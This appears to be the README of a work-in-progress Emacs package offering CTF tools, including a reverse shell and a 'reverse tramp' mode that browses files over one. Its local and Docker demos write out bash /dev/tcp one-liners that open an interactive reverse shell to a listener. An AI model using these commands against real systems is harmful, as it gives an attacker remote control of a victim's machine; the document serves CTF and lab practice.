#+title: Cyb.el

WIP: Provide tools for CTF challenges.

* Features
** Reverse shell
#+BEGIN_SRC emacs-lisp
(cybel-revshell)
#+END_SRC
** Reverse tramp
still unstable
Known issues:
- vterm kills the connection
- shell-command works whereas async-shell-command does not
- eshell is unstable (executing does not work)
*** Local demo
In Emacs
#+BEGIN_SRC emacs-lisp
(find-file "/rev:127.0.0.1#1111:")
#+END_SRC
With another account run
#+BEGIN_SRC bash
bash -i >& /dev/tcp/127.0.0.1/1111 0>&1 ; echo $?
#+END_SRC

A dired buffer will open.
*** Docker demo
In Emacs
#+BEGIN_SRC emacs-lisp
(find-file "/rev:127.0.0.1#1111:")
#+END_SRC
in the hosts
#+BEGIN_SRC bash
docker run -it ubuntu bash
# spawns a container and attach itself to it
bash -i >& /dev/tcp/172.17.0.1/1111 0>&1 ; echo $?
# depending on your network config
# change the ip adreress as needed
#+END_SRC

A dired buffer will open in emacs, where the reverse shell is started.
then execute ~M-x shell-command~, ~whoami~ to confirm.
